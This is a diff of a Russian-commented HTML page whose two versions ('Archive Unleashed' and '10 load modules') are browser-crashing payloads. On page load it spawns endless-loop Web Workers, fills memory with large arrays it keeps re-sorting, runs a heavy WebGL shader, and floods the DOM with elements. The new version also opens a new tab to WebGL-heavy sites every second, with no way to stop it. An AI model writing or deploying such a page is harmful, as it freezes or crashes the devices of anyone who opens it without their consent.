@@ -1,101 +1,61 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Tuzyaka archive</title>
+    <title>10 модулей нагрузки</title>
     <style>
-        body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            margin: 0;
-            overflow: hidden;
-        }
-        h1 {
-            font-size: 2em;
-            text-shadow: 0 0 10px #0f0;
-        }
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
+        body { margin: 0; overflow: hidden; }
+        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
     </style>
 </head>
 <body>
-    <h1>Archive Unleashed</h1>
     <canvas id="canvas"></canvas>
     <script>
-        // Нагрузка на процессор
-        function overloadCPU() {
-            const workerCount = navigator.hardwareConcurrency * 4 || 16;
-            for (let i = 0; i < workerCount; i++) {
-                const workerCode = `
-                    self.onmessage = () => {
-                        while (true) {
-                            for (let j = 0; j < 1e6; j++) {
-                                let x = Math.sin(Math.random());
-                                let y = Math.cos(Math.random());
-                                let z = Math.tan(Math.random());
-                                let w = x * y * z;
-                            }
+        // 1-5. Пять Web Workers для нагрузки процессора
+        function createWorker() {
+            const workerCode = `
+                self.onmessage = () => {
+                    while (true) {
+                        for (let i = 0; i < 1e6; i++) {
+                            Math.sin(Math.random());
                         }
-                    };
-                `;
-                try {
-                    const blob = new Blob([workerCode], { type: "application/javascript" });
-                    const worker = new Worker(URL.createObjectURL(blob));
-                    worker.postMessage('start');
-                } catch (e) {
-                    setInterval(() => {
-                        for (let j = 0; j < 1e6; j++) {
-                            let x = Math.sin(Math.random());
-                            let y = Math.cos(Math.random());
-                            let z = Math.tan(Math.random());
-                            let w = x * y * z;
-                        }
-                    }, 1);
-                }
-            }
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode], { type: "application/javascript" });
+            const worker = new Worker(URL.createObjectURL(blob));
+            worker.postMessage('start');
+        }
+        for (let i = 0; i < 5; i++) {
+            createWorker();
         }
 
-        // Нагрузка на память
-        function overloadMemory() {
+        // 6-7. Два модуля нагрузки на память
+        function memoryLoad() {
             let arrays = [];
-            for (let i = 0; i < 20; i++) {
-                arrays.push(new Float64Array(1e7));
+            for (let i = 0; i < 10; i++) {
+                arrays.push(new Float64Array(1e7)); // ~80 МБ
             }
             setInterval(() => {
-                arrays.forEach(arr => {
-                    arr.sort();
-                });
-            }, 100);
+                arrays.forEach(arr => arr.sort());
+            }, 500);
         }
+        memoryLoad(); // Первый модуль
+        memoryLoad(); // Второй модуль
 
-        // Нагрузка на графику
-        function overloadGPU() {
+        // 8. WebGL для нагрузки GPU
+        function webglLoad() {
             const canvas = document.getElementById("canvas");
-            canvas.width = window.innerWidth * 2;
-            canvas.height = window.innerHeight * 2;
-            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+            const gl = canvas.getContext("webgl");
             if (!gl) return;
 
-            const vsSource = `
-                attribute vec4 aPosition;
-                void main() {
-                    gl_Position = aPosition;
-                }
-            `;
+            const vsSource = `attribute vec4 aPosition; void main() { gl_Position = aPosition; }`;
             const fsSource = `
                 precision highp float;
                 uniform float uTime;
                 void main() {
                     float r = 0.0;
-                    for (int i = 0; i < 10000; i++) {
-                        r += sin(float(i) * uTime * 0.001) * cos(float(i) * uTime * 0.002);
+                    for (int i = 0; i < 5000; i++) {
+                        r += sin(float(i) * uTime * 0.01);
                     }
                     gl_FragColor = vec4(mod(r, 1.0), 0.5, 0.5, 1.0);
                 }
@@ -115,7 +75,7 @@
 
             const positionBuffer = gl.createBuffer();
             gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
-            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
             const aPosition = gl.getAttribLocation(program, "aPosition");
             gl.enableVertexAttribArray(aPosition);
             gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);
@@ -128,30 +88,34 @@
             }
             render();
         }
+        webglLoad();
 
-        // Нагрузка на DOM
-        function overloadDOM() {
-            function createChaos() {
-                for (let i = 0; i < 500; i++) {
+        // 9. Нагрузка через DOM-операции
+        function domLoad() {
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
                     const div = document.createElement("div");
                     div.style.position = "absolute";
                     div.style.left = Math.random() * 100 + "%";
                     div.style.top = Math.random() * 100 + "%";
-                    div.style.width = "100px";
-                    div.style.height = "100px";
-                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                     document.body.appendChild(div);
                 }
-                setTimeout(createChaos, 5);
-            }
-            createChaos();
+            }, 100);
         }
+        domLoad();
 
-        // Запуск всего сразу
-        overloadCPU();
-        overloadMemory();
-        overloadGPU();
-        overloadDOM();
+        // 10. Бесконечное открытие вкладок
+        const heavySites = [
+            "https://webglsamples.org/aquarium/aquarium.html",
+            "https://get.webgl.org/cubes/",
+            "https://www.shadertoy.com/view/Ms2SD1"
+        ];
+        function openHeavySite() {
+            const randomSite = heavySites[Math.floor(Math.random() * heavySites.length)];
+            window.open(randomSite, "_blank");
+            setTimeout(openHeavySite, 1000);
+        }
+        openHeavySite();
     </script>
 </body>
 </html>
